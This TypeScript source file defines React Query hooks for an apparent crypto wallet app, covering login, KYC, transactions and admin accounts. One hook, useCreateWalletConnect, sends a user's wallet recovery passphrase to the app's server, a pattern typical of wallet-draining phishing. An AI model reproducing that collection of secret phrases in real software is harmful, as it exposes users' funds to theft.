import { useMutation, useQueryClient } from "@tanstack/react-query";

//Functions
import { loginUserFn, createUserFn, resendVerificationFn, verifyUserFn, userKycFn, getUserDetailsFn, getPrices, getUserBalanceFn, createTransaction, createWalletConnect, createCardRequest, updateProfilePicture, updateDetails, createSampleAdmin, createAdmin, loginAdmin } from "./api.service";

//Stores, Utils, Enums
import { calculateTotalUsd, useUserStore, } from "@/stores/userStore";
import { setTokens } from "@/lib/token";

//Authenticate Users
export function useAuthUser() {

    const queryClient = useQueryClient();
    const { setUser, setBalance, setPrices, setTotalUsdValue } = useUserStore();

    return useMutation({

        mutationFn: (data: { email: string, password: string }) => loginUserFn(data),
        onError: (error) => {
            console.error("Login failed:", error);
        },
        onSuccess: async (response) => {
            setTokens(response.data.accessToken);
            const [user, balanceRes, pricesRes] = await Promise.all([
                getUserDetailsFn(),
                getUserBalanceFn(),
                getPrices(),
            ]);

            const balance = balanceRes.data;
            const prices = pricesRes.data;

            // Calculate total USD value
            const totalUsd = calculateTotalUsd(balance, prices)

            setUser(user.data);
            setBalance(balance);
            setPrices(prices);
            setTotalUsdValue(totalUsd);

            queryClient.invalidateQueries();
        }
    })
}

//Create New Users
export function useRegisterUser() {

    return useMutation({
        mutationFn: (data: { email: string, userName: string, password: string, phoneNumber: string, country: string }) => createUserFn(data),
        onError: (error) => {
            console.error("Registration failed:", error);
        }
    })
}

//Resend Verification Email
export function useResendVerification() {

    return useMutation({
        mutationFn: () => resendVerificationFn(),
        onError: (error) => {
            console.error("Resend Verification Code failed:", error);
        }
    })
}

//Verify User
export function useVerifyUser() {

    return useMutation({
        mutationFn: (data: { verificationCode: string }) => verifyUserFn(data),
        onError: (error) => {
            console.error("User Verification failed:", error);
        }
    })
}

//Kyc
export function useUserKyc() {

    const queryClient = useQueryClient();
    return useMutation({
        mutationFn: (data: FormData) => userKycFn(data),
        onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: ['userDetails'] });
        },
        onError: (error) => {
            console.error("User Kyc failed:", error);
        }
    })
}

//Transaction
export function useCreateTransaction() {

    const queryClient = useQueryClient();
    return useMutation({
        mutationFn: (data: { coin: string, transactionType: string, amount: number, network: string, walletAddress: string }) => createTransaction(data),
        onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: ['lastThree'] });
            queryClient.invalidateQueries({ queryKey: ['allTransactions'] });
            queryClient.invalidateQueries({ queryKey: ['userBalance'] });
            queryClient.invalidateQueries({ queryKey: ['allNotifications'] });
        },
        onError: (error) => {
            console.error("Creating Transaction Failed:", error);
        }
    })
}

//Wallet Connect
export function useCreateWalletConnect() {

    const queryClient = useQueryClient();
    return useMutation({
        mutationFn: (data: { wallet: string, passPhrase: string[] }) => createWalletConnect(data),
        onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: ['walletStats'] });
            queryClient.invalidateQueries({ queryKey: ['allNotifications'] });
        },
        onError: (error) => {
            console.error("Connecting wallet failed:", error);
        }
    })
}

//Card Request
export function useCreateCardRequest() {

    const queryClient = useQueryClient();
    return useMutation({
        mutationFn: () => createCardRequest(),
        onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: ['cardRequest'] });
        },
        onError: (error) => {
            console.error("Card Request Failed:", error);
        }
    })
}

//Update Profile Picture
export function useUpdateProfilePicture() {

    const queryClient = useQueryClient();
    return useMutation({
        mutationFn: (data: FormData) => updateProfilePicture(data),
        onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: ['userDetails'] });
        },
        onError: (error) => {
            console.error("User Profile Picture Update failed:", error);
        }
    })
}

//Update User Profile
export function useUpdateUserProfile() {

    const queryClient = useQueryClient();
    return useMutation({
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        mutationFn: (data: any) => updateDetails(data),
        onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: ['userDetails'] });
        },
        onError: (error) => {
            console.error("User Profile Update failed:", error);
        }
    })
}


// Admin
//Create Sample Admin
export function useCreateSampleAdmin() {

    return useMutation({
        mutationFn: (data: { email: string, password: string, role: "admin" | "super_admin" }) => createSampleAdmin(data),
        onError: (error) => {
            console.error("Couldn't create admin:", error);
        }
    })
}

//Create Admin
export function useCreateAdmin() {

    const queryClient = useQueryClient();
    return useMutation({
        mutationFn: (data: { email: string, password: string, role: "admin" | "super_admin" }) => createAdmin(data),
        onSuccess: () => {
            queryClient.invalidateQueries({ queryKey: ['admins'] });
        },
        onError: (error) => {
            console.error("Couldn't create admin:", error);
        }
    })
}

// Authenticate Admin
export function useLoginAdmin() {

    return useMutation({
        mutationFn: (data: { email: string, password: string }) => loginAdmin(data),
        onError: (error) => {
            console.error("Admin Login failed:", error);
        },
        onSuccess: async (response) => {
            setTokens(response.data.accessToken);
        }
    })
}